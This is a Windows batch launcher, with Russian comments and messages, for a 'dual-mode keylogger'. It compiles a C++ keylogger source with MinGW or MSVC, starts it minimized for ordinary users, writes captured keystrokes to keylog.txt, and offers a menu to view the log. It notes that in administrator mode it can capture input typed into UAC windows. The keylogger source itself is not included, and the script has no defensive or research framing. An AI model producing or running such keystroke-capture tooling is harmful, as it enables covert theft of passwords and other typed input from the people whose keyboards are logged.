@echo off
chcp 65001 >nul
title Dual-Mode Keylogger Launcher
color 0A

:: Проверяем, запущен ли BAT от администратора
net session >nul 2>&1
if %errorLevel% equ 0 (
    set "ADMIN_MODE=1"
    set "MODE_TEXT=АДМИНИСТРАТОР"
    set "COLOR=0C"
) else (
    set "ADMIN_MODE=0"
    set "MODE_TEXT=ОБЫЧНЫЙ ПОЛЬЗОВАТЕЛЬ"
    set "COLOR=0A"
)

color %COLOR%

cls
echo ================================================
echo         DUAL-MODE KEYLOGGER LAUNCHER
echo ================================================
echo.
echo Текущий режим: %MODE_TEXT%
echo.

:: Переходим в директорию скрипта
cd /d "%~dp0"

:: Проверяем существование exe файла
if not exist "keylogger.exe" (
    echo [*] Компиляция программы...
    echo.
    
    :: Пробуем разные компиляторы
    where g++ >nul 2>&1
    if !errorlevel! equ 0 (
        echo Компиляция с помощью MinGW...
        g++ -o keylogger.exe dual_mode_keylogger.cpp -luser32 -lgdi32 -lole32 -luuid -static-libgcc -static-libstdc++
        if !errorlevel! equ 0 (
            echo [OK] Компиляция успешна!
            goto :RUN
        )
    )
    
    where cl >nul 2>&1
    if !errorlevel! equ 0 (
        echo Компиляция с помощью MSVC...
        cl /EHsc /Fe:keylogger.exe dual_mode_keylogger.cpp user32.lib gdi32.lib ole32.lib uuid.lib
        if !errorlevel! equ 0 (
            echo [OK] Компиляция успешна!
            goto :RUN
        )
    )
    
    echo [ERROR] Не удалось найти компилятор!
    echo Установите MinGW или Visual Studio Build Tools
    pause
    exit /b 1
)

:RUN
echo.
echo [OK] Программа найдена
echo.

:: Создаем лог файл если его нет
if not exist "keylog.txt" (
    echo === Keylogger Log === > keylog.txt
    echo Дата запуска: %date% %time% >> keylog.txt
    echo Режим: %MODE_TEXT% >> keylog.txt
    echo ==================== >> keylog.txt
    echo. >> keylog.txt
)

:: Запускаем программу
echo [*] Запуск программы...
echo.

:: Если запущено от администратора - показываем окно
if "%ADMIN_MODE%"=="1" (
    start "Keylogger [ADMIN]" keylogger.exe
) else (
    start /min "Keylogger [USER]" keylogger.exe
)

if %errorlevel% equ 0 (
    echo [OK] Программа запущена
    echo.
    echo Лог файл: %cd%\keylog.txt
    echo.
    
    if "%ADMIN_MODE%"=="1" (
        echo [!] ВНИМАНИЕ: Режим администратора
        echo    Программа может перехватывать ввод в окнах UAC
    ) else (
        echo [!] ВНИМАНИЕ: Обычный режим
        echo    UAC НЕ перехватывается (нет прав)
    )
    
    echo.
    echo Выберите действие:
    echo 1 - Показать последние записи из лога
    echo 2 - Открыть папку с логом
    echo 3 - Выход
    echo.
    
    choice /c 123 /n /m "Выберите (1-3): "
    
    if %errorlevel% equ 1 (
        echo.
        echo ========== ПОСЛЕДНИЕ ЗАПИСИ ==========
        echo.
        type keylog.txt | findstr /v "^===" | findstr /v "Дата запуска" | findstr /v "Режим" | findstr /n ".*"
        echo.
        echo ======================================
        pause
    )
    
    if %errorlevel% equ 2 (
        explorer /select,"%cd%\keylog.txt"
    )
    
) else (
    echo [ERROR] Ошибка запуска!
    pause
)

exit /b 0